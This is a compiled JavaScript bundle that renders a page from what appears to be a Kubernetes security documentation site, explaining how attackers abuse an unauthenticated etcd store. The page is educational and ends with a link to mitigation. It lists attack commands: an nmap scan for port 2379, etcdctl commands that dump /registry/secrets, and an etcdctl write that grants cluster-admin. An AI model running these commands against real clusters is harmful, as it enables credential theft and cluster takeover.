"use strict";(self.webpackChunkk_8_s_security=self.webpackChunkk_8_s_security||[]).push([[2741],{8453:(e,t,s)=>{s.d(t,{R:()=>i,x:()=>a});var r=s(6540);const n={},c=r.createContext(n);function i(e){const t=r.useContext(c);return r.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function a(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(n):e.components||n:i(e.components),r.createElement(c.Provider,{value:t},e.children)}},9366:(e,t,s)=>{s.r(t),s.d(t,{assets:()=>o,contentTitle:()=>a,default:()=>u,frontMatter:()=>i,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"attack_vectors/unrestricted_etcd_access","title":"Unrestricted etcd Access","description":"How attackers exploit unrestricted access to etcd to retrieve Kubernetes secrets and take control of the cluster.","source":"@site/docs/attack_vectors/unrestricted_etcd_access.md","sourceDirName":"attack_vectors","slug":"/attack_vectors/unrestricted_etcd_access","permalink":"/docs/attack_vectors/unrestricted_etcd_access","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1742774115000,"sidebarPosition":7,"frontMatter":{"sidebar_position":7,"title":"Unrestricted etcd Access","description":"How attackers exploit unrestricted access to etcd to retrieve Kubernetes secrets and take control of the cluster."},"sidebar":"default","previous":{"title":"Supply Chain Attacks","permalink":"/docs/attack_vectors/supply_chain_attacks"},"next":{"title":"Insecure RBAC Permissions","permalink":"/docs/attack_vectors/insecure_rbac_permissions"}}');var n=s(4848),c=s(8453);const i={sidebar_position:7,title:"Unrestricted etcd Access",description:"How attackers exploit unrestricted access to etcd to retrieve Kubernetes secrets and take control of the cluster."},a="Unrestricted etcd Access",o={},d=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Scan for Open etcd Endpoints",id:"1-scan-for-open-etcd-endpoints",level:3},{value:"2. Enumerate etcd Keys",id:"2-enumerate-etcd-keys",level:3},{value:"3. Extract Kubernetes Secrets",id:"3-extract-kubernetes-secrets",level:3},{value:"4. Modify Cluster Configuration",id:"4-modify-cluster-configuration",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2}];function l(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,c.R)(),...e.components};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(t.header,{children:(0,n.jsx)(t.h1,{id:"unrestricted-etcd-access",children:"Unrestricted etcd Access"})}),"\n",(0,n.jsxs)(t.p,{children:[(0,n.jsx)(t.strong,{children:"etcd"})," is the key-value store that holds all Kubernetes cluster data, including ",(0,n.jsx)(t.strong,{children:"secrets, configuration, and state"}),". If exposed or misconfigured, it becomes a high-value target for attackers who can ",(0,n.jsx)(t.strong,{children:"retrieve credentials, modify cluster settings, or delete critical resources"}),"."]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,n.jsxs)(t.p,{children:["An attacker targets an unprotected ",(0,n.jsx)(t.code,{children:"etcd"})," endpoint to access or manipulate cluster-wide data."]}),"\n",(0,n.jsx)(t.h3,{id:"1-scan-for-open-etcd-endpoints",children:"1. Scan for Open etcd Endpoints"}),"\n",(0,n.jsxs)(t.p,{children:["The attacker scans the network to locate accessible etcd instances (port ",(0,n.jsx)(t.code,{children:"2379"}),"):"]}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"nmap -p 2379 --open <cluster-ip-range>\n"})}),"\n",(0,n.jsxs)(t.p,{children:["If port ",(0,n.jsx)(t.code,{children:"2379"})," is exposed, the attacker targets it for further exploitation."]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"2-enumerate-etcd-keys",children:"2. Enumerate etcd Keys"}),"\n",(0,n.jsx)(t.p,{children:"Without authentication or TLS, the attacker can query the keyspace:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 get / --prefix --keys-only\n"})}),"\n",(0,n.jsxs)(t.p,{children:["This reveals the structure and contents of etcd, including keys under ",(0,n.jsx)(t.code,{children:"/registry/"})," that store Kubernetes resources."]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"3-extract-kubernetes-secrets",children:"3. Extract Kubernetes Secrets"}),"\n",(0,n.jsx)(t.p,{children:"The attacker dumps secrets directly from etcd:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:"ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 get /registry/secrets --prefix\n"})}),"\n",(0,n.jsx)(t.p,{children:"This includes service account tokens, API keys, kubeconfig files, and other sensitive credentials."}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"4-modify-cluster-configuration",children:"4. Modify Cluster Configuration"}),"\n",(0,n.jsx)(t.p,{children:"With write access, the attacker injects new configuration or escalates privileges:"}),"\n",(0,n.jsx)(t.pre,{children:(0,n.jsx)(t.code,{className:"language-bash",children:'ETCDCTL_API=3 etcdctl --endpoints=<etcd-ip>:2379 put /registry/rbac/rolebindings/cluster-admin \'{"user": "attacker", "role": "cluster-admin"}\'\n'})}),"\n",(0,n.jsxs)(t.p,{children:["This effectively grants ",(0,n.jsx)(t.code,{children:"cluster-admin"})," rights to any user they choose."]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,n.jsx)(t.p,{children:"The attacker achieves full compromise of the Kubernetes cluster by:"}),"\n",(0,n.jsxs)(t.ul,{children:["\n",(0,n.jsx)(t.li,{children:"Extracting sensitive secrets"}),"\n",(0,n.jsx)(t.li,{children:"Gaining persistent admin access"}),"\n",(0,n.jsx)(t.li,{children:"Modifying or deleting critical cluster resources"}),"\n"]}),"\n",(0,n.jsxs)(t.p,{children:["If etcd is not protected, the ",(0,n.jsx)(t.strong,{children:"entire cluster is at risk"}),"."]}),"\n",(0,n.jsx)(t.hr,{}),"\n",(0,n.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,n.jsxs)(t.p,{children:["\u27a1 ",(0,n.jsx)(t.a,{href:"/docs/best_practices/cluster_setup_and_hardening/control_plane_security/etcd_security_mitigation",children:"Securing etcd in Kubernetes"})]})]})}function u(e={}){const{wrapper:t}={...(0,c.R)(),...e.components};return t?(0,n.jsx)(t,{...e,children:(0,n.jsx)(l,{...e})}):l(e)}}}]);